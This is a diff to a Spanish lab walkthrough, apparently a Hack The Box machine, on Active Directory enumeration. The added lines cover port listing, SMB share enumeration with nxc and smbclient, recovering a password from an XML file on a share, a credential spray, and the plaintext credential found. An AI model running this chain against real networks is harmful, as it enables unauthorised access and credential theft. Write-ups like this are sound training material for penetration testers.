@@ -34,6 +34,7 @@
 > - *88 - Kerberos*
 > - *135-RPC*
 > - *389/3268 - LDAP*
+> - *598*
 
 Confirmación de dominio
 `nxc smb 10.10.10.172 -u '' -p ''`
@@ -91,4 +92,16 @@ SABatchJobs:SABatchJobs
 ### Enumeracion recursos compoartidos SMB
 `nxc smb  10.10.10.172 -u SABatchJobs -p SABatchJobs --shares`
 
-Vemos un recurso compa
+Vemos un recurso compartido interesante y accedemos a el
+`smbclient //10.10.10.172/users$ -U SABatchJobs`
+
+En el directorio `mhope` encontramos un archivo `.xml` nos lo traemos a nuestra maquina de atacante en ese archivo encontramos una contraseña, que la vamos a guardar y hacemos fuerza bruta con user y password
+`nxc smb 10.10.10.172 -u users -p passwd`
+
+```ad-hint
+mhope:4n0therD4y@n0th3r$
+```
+
+Volvemos a listar recursos para ver si hay algo diferente
+
+### 5985
